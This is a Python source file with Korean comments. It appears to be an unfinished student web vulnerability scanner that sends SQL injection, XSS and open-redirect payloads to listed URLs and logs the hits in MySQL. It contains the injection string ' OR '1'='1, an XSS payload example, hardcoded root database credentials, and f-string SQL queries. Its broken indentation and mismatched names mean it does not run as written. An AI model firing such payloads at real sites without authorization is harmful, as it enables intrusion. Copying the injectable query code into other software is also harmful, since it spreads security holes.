import requests
import hashlib
from bs4 import BeautifulSoup
from selenium import webdriver
import mysql.connector


class Attack:
    def __init__(self):
        try:
            # MySQL에 연결
            self.attackDB = mysql.connector.connect(host="localhost", user="root", password="1111", database="attackDB")
            self.mycursor = self.attackDB.cursor()
        except mysql.connector.Error as err:
            # 연결 실패-> 오류 메시지 출력
            print(f"Error: {err}")
            return
        
        # 데이터를 초기화합니다.
        self.init_data()

    # 데이터 초기화 함수
    def get_data(self, table, column):
        try:
            # 선택한 열의 데이터를 가져옵니다.
            self.mycursor.execute(f"SELECT {column} FROM {table}")
            results = self.mycursor.fetchall()
            # 결과를 리스트로 반환합니다.
            return [row[0] for row in results]
        except mysql.connector.Error as err:
            # 실패하면 오류 메시지를 출력합니다.
            print(f"Error: {err}")
            return []
        
    #get_data 함수를 통해 
    # 태그값 data
    # 페이로드
    # url 
    # 공격유형 가져오기(보류)
    # 해야할일 = 코드 내에서 더 필요한 DB정보가 무엇인지 정리하기
    def init_data(self):

        # 각 공격 유형에 대한 페이로드
        self.payloads = {
            "sqli": self.get_data('payloads_sqli', 'payload'),
            "Reflected_xss": self.get_data('payloads_Reflectedxss', 'payload'),
            "Stored_xss": self.get_data('payloads_Storedxss', 'payload'),
            "Dom_based_xss": self.get_data('payloads_Domxss', 'payload'),
            "or": self.get_data('payloads_or', 'payload'),
        }

        # 공격할 URL들
        self.urls = self.get_data('urls', 'url')

        # 공격에 사용할 데이터
        # input 태그 정보들이 들어가야할 듯
        self.data = {
            "or": self.get_data('or_data', 'data'),
            "Reflected_xss": self.get_data('Reflectedxss_data', 'data'),
            "Stored_xss": self.get_data('Storedxss_data', 'data'),
            "Dom_based_xss": self.get_data('Domxss_data', 'data'),
            "sqli": self.get_data('sqli_data', 'data'),
        }


def attack(self):
        # 공격 유형에 따른 페이로드와 데이터를 순회
        for attack_type in self.payloads.keys():
        # 각 공격 유형에 대한 페이로드와 데이터
            payloads = self.payloads[attack_type]
            data = self.data[attack_type]
        
        # url 요청 보내고 HTML 정보 받기
        for url in self.get_data('urls', 'url'):
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

        # input 태그 정보 확인 (해야할일 = 필요한 태그는 추가해야함)
        for input_tag in soup.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value')

        # Reflected_XSS 취약점 확인(get요청)
        Reflected_xss_payloads = self.get_data('Reflected_xss_payload', 'payload')

        for Reflected_xss_payload in Reflected_xss_payloads:
            Reflected_xss_payload += hashlib.md5(Reflected_xss_payload.encode()).hexdigest()

            # GET 요청을 통한 Reflected XSS 테스트
            Reflected_xss_response_get = requests.get(url, params={name: Reflected_xss_payload})
            if Reflected_xss_payload in Reflected_xss_response_get.text:
                print(f'Possible Reflected XSS in {name} GET request')
                self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter, method) VALUES (%s, %s, %s, %s)", (url, 'Reflected XSS', name, 'GET'))

            # POST 요청을 통한 Reflected XSS 테스트
            Reflected_xss_response_post = requests.post(url, data={name: Reflected_xss_payload})
            if Reflected_xss_payload in Reflected_xss_response_post.text:
                print(f'Possible Reflected XSS in  {name} POST request')
                self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter, method) VALUES (%s, %s, %s, %s)", (url, 'Reflected XSS', name, 'POST'))
    
    # Stored_XSS 취약점 확인
    #보낸 input 값이 서버에 저장되는지(Stored)
    # -> 위의 웹사이트 url('http://example.com')
    # 해야할일 : 예시 게시판 글쓰기 URL *이걸 어떻게 구현할지 같이 고민해봐요!* -> 해결?
    # 해야할일 = Stored_xss_payload에 들어갈 내용 찾아서 정리하기 (DVWA 기준으로)
        
            # 'Stored_xss_payload'데이터 가져오기
            Stored_xss_payloads = self.get_data('payloads_Storedxss', 'payload')

            for Stored_xss_payload in Stored_xss_payloads:
                Stored_xss_payload += hashlib.md5(Stored_xss_payload.encode()).hexdigest() 
                
                # 웹사이트를 방문하여 게시판 글쓰기 URL 찾기
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                form = soup.find('form', action=True)
                if form:
                    post_url = form['action']  # 게시판 글쓰기 URL
                
                    # 게시판에 악성 스크립트를 포함한 글을 작성 후
                    # POST 요청
                    post_data = {'title': 'Test', 'content': Stored_xss_payload}
                    post_response = requests.post(post_url, data=post_data)

                    # 글이 정상적으로 작성되었다면 웹사이트를 다시 방문
                    if post_response.status_code == 200:
                        response = requests.get(url)
                        soup = BeautifulSoup(response.text, 'html.parser')

                    # 웹페이지에 악성 스크립트가 포함되어 있다면 Stored XSS 취약점이 존재
                    if Stored_xss_payload in soup.prettify():
                        print('Possible Stored XSS in {post_url}')
                        self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter, method) VALUES (%s, %s, %s, %s)", (url, 'Stored XSS', name, 'POST'))

    
            # DOM_based_XSS 취약점 확인
            # DOM 조작을 통해 실행되는지(DOM based)
            # -> 위의 웹사이트 url('http://example.com')
            # 해야할일 = DOM_based_xss_payload에 들어갈 내용 찾아서 정리하기 (DVWA 기준으로)
            DOM_based_xss_payloads = self.get_data('DOM_based_xss_payload', 'payload')
            for DOM_based_xss_payload in DOM_based_xss_payloads:

                # 웹 브라우저를 시작
                driver = webdriver.Chrome()

                # 웹사이트 방문
                driver.get(url)

                '''
                (일단 payload에 무슨 값을 넣을지 모르겠어서 일단 킵)
                각 HTML 태그에 대한 element를 찾기
                html_tags = ['input', 'textarea', 'select', 'button', 'a', 'img', 'iframe', 'script']

                for tag in html_tags:
                elements = driver.find_elements_by_tag_name(tag)
                for element in elements:
                try:
                if element.get_attribute('id') == 'xss':
                print(f'Possible DOM-based XSS in {url} at {tag} tag')
                self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'DOM-based XSS', tag))
                except:
                continue'''


                # (1) 웹 페이지의 <body> 태그 내부에 악성 스크립트를 추가
                driver.execute_script(f'document.body.innerHTML += `{DOM_based_xss_payload}`;')

                # (1) 악성 스크립트가 DOM에 추가되었는지 확인
                # 예시에서 <img id="xss" src=x onerror=alert(1)>를 사용
                # 그래서 id값을 확인
                # -> id값, 
                if driver.find_element_by_id('xss'):
                    print('Possible DOM-based XSS in {url}')
                    self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'DOM-based XSS', name))
            
                # (2) 특정 요소에 악성 스크립트 추가
                # 선택자 'selector'에 해당하는 첫 번째 요소 내에 악성 스크립트를 추가
                # 요소 안에 특정 id (예: 'xss')를 가진 요소가 있는지 확인
                driver.execute_script(f"document.querySelector('selector').innerHTML += `{DOM_based_xss_payload}`;")

                # (2) 악성 스크립트가 DOM에 추가되었는지 확인
                # 악성 스크립트가 추가된 요소 내에서 특정 id를 가진 요소 확인
                if driver.execute_script("return document.querySelector('selector #xss');"):
                    print(f'Possible DOM-based XSS in {url}')
                    self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'DOM-based XSS', 'selector'))

                # (3) 새로운 요소 생성하고 악성 스크립트 추가
                # <div> 요소를 생성-> 요소에 악성 스크립트를 추가
                # 요소 내에서 id가 'xss'인 요소가 있는지 확인
                driver.execute_script(f"""
                    let newElement = document.createElement('div');
                    newElement.innerHTML = `{DOM_based_xss_payload}`;
                    document.body.appendChild(newElement);
                """)
                # (3) 악성 스크립트가 DOM에 추가되었는지 확인
                # 'div #xss' = CSS 선택자
                #  -> 'div' 태그 내에 id가 'xss'인 요소
                # 'div' 태그 내에 id가 'xss'인 요소가 있는지를 확인
                if driver.execute_script("return document.querySelector('div #xss');"):
                    print(f'Possible DOM-based XSS in {url}')
                    self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'DOM-based XSS', 'div'))

                # (4) 특정 요소의 속성 값으로 악성 스크립트 추가
                driver.execute_script(f"document.querySelector('selector').setAttribute('attributeName', `{DOM_based_xss_payload}`);")

                # (4) 악성 스크립트가 DOM에 추가되었는지 확인
                if driver.execute_script("return document.querySelector('selector').getAttribute('attributeName') == `{DOM_based_xss_payload}`;"):
                    print(f'Possible DOM-based XSS in {url}')
                    self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'DOM-based XSS', 'attributeName'))

                # 웹 브라우저를 종료
                driver.quit()


            # SQL Injection 공격 요청 패킷 보내기
            sqli_payload = "' OR '1'='1"
            sqli_response = requests.get(url, params={name: sqli_payload})
        
            # 응답에서 SQLi 취약점 확인
            if 'error' in sqli_response.text:
                print(f'Possible SQL Injection in {name}')
                self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'SQL Injection', name))



            # Open Redirection 확인
            Open_Redirection_payloads = self.get_data('payloads_or', 'payload')
            for or_payload in Open_Redirection_payloads:
                or_response = requests.get(url, params={'name': or_payload}, allow_redirects=False)

                # 응답에서 'http'가 포함되어 있다면
                # Open Redirection 취약점이 존재할 수 있는 신호
                if 'http' in value:
                    print(f'Possible Open Redirection in {name} with value {value}')

                # 응답 헤더에 'Location'이 있고
                # 'Location' 값이 우리가 설정한 악성 URL일 때
                # Open Redirection 취약점이 존재할 수 있는 신호
                if 'Location' in or_response.headers and or_payload in or_response.headers['Location']:
                    print(f'Possible Open Redirection in {name}')
                    self.mycursor.execute("INSERT INTO vulnerabilities (url, type, parameter) VALUES (%s, %s, %s)", (url, 'Open Redirection', name))

                # DB에 변경 사항 저장
                self.attackDB.commit()


if __name__ == "__main__":
    attack = Attack()
    attack.attack()